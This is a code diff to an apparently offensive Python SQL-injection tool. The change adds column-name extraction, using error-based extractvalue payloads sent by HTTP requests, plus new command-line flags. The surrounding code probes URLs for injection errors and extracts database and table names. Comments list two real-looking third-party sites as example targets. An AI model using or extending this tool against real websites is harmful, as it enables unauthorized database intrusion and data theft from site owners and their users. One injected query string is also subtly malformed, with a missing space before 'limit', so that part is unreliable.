@@ -7,7 +7,7 @@ from bs4 import BeautifulSoup as BS
 # https://www.cityimmo.ch/reservations.php?lang=FR&todo=res&;id=22
 # http://www.meggieschneider.com/php/detail.php?id=48
 
-def Main(test, get_database_type, dbname, tablenames, dump):
+def Main(test, get_database_type, dbname, tablenames, dump, columns, colum_name):
     if args.test:
         urls = [args.test + "'", args.test + '"', args.test[:-4] + ';', args.test[:-4] + ")", args.test[:-4] + "')", args.test[:-4] + '")', args.test[:-4] + '*'] 
         vulnerable_text = ['MySQL Query fail:', '/www/htdocs/', 'Query failed', 'mysqli_fetch_array()', 'mysqli_result', 'Warning: ', 'MySQL server', 'SQL syntax', 'You have an error in your SQL syntax;', 'mssql_query()', "Incorrect syntax near '='", 'mssql_num_rows()', 'Notice: ']
@@ -37,6 +37,17 @@ def Main(test, get_database_type, dbname, tablenames, dump):
         str2 = str1.find('\'')
         str3 = str1[:str2]
         print("\nTable names: " + str3)
+    elif args.columns:
+        print('Extracting Columns...')
+        link = str(args.columns) + " and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name=" + args.colum_name + "limit 0,1)))--"
+        results = requests.get(link)
+        data = results.text 
+        str_num = str(data).find('error: ')
+        str1_num = data[str_num:]
+        str1 = str1_num[8:]
+        str2 = str1.find('\'')
+        str3 = str1[:str2]
+        print("\Column names: " + str3)
     elif args.dbname:
         link = args.dbname + " and extractvalue(1,concat(1,(select database()))) --" # " and extractvalue(0x0a,concat(0x0a,(select database())))--"
         print(link)
@@ -89,11 +100,15 @@ if __name__ == '__main__':
     ap.add_argument('-gdt', '--get_database_type', type=str, help='Find backend DB type')
     ap.add_argument('-dbn', '--dbname', type=str, help='Get database name')
     ap.add_argument('-tn', '--tablenames', type=str, help='Get table names')
+    ap.add_argument('-c', '--columns', type=str, help="Get Column names")
+    ap.add_argument('-cn', '--colum_name', type=str, help='Column Name')
     ap.add_argument('-d', '--dump', type=str, help="Dump the Database")
     args = ap.parse_args()
     test = args.test
     dbname = args.dbname
     tablenames = args.tablenames
     dump = args.dump
+    columns = args.columns
+    colum_name = args.colum_name
     get_database_type = args.get_database_type
-    Main(test, get_database_type, dbname, tablenames, dump)
+    Main(test, get_database_type, dbname, tablenames, dump, columns, colum_name)
